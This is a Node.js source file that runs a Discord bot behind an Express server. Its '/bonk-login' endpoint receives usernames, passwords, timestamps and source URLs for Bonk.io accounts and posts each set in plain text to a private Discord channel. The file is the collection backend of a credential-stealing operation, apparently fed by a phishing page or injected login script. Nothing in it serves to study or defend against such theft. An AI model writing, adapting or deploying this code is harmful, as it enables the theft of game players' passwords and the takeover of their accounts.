const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

app.use(express.json());

client.once('ready', () => {
    console.log(`🤖 Bot logged in as ${client.user.tag}`);
});

app.post('/bonk-login', async (req, res) => {
    try {
        const { username, password, timestamp, url } = req.body;

        const channel = client.channels.cache.get(CHANNEL_ID);
        if (!channel) {
            return res.status(404).json({ error: 'Channel not found' });
        }

        const embed = new EmbedBuilder()
            .setTitle('🔐 New Bonk.io Login')
            .setColor(0x0099ff)
            .addFields(
                { name: '👤 Username', value: `\`\`\`${username}\`\`\``, inline: true },
                { name: '🔑 Password', value: `\`\`\`${password}\`\`\``, inline: true },
                { name: '⏰ Time', value: new Date(timestamp).toLocaleString(), inline: false },
                { name: '🌐 Source', value: `[Bonk.io](${url})`, inline: false }
            )
            .setTimestamp();

        await channel.send({ embeds: [embed] });
        res.json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'Bonk.io Discord Bot is running' });
});

client.login(BOT_TOKEN)
    .then(() => {
        app.listen(PORT, () => {
            console.log(`🚀 Server running on port ${PORT}`);
        });
    })
    .catch(console.error);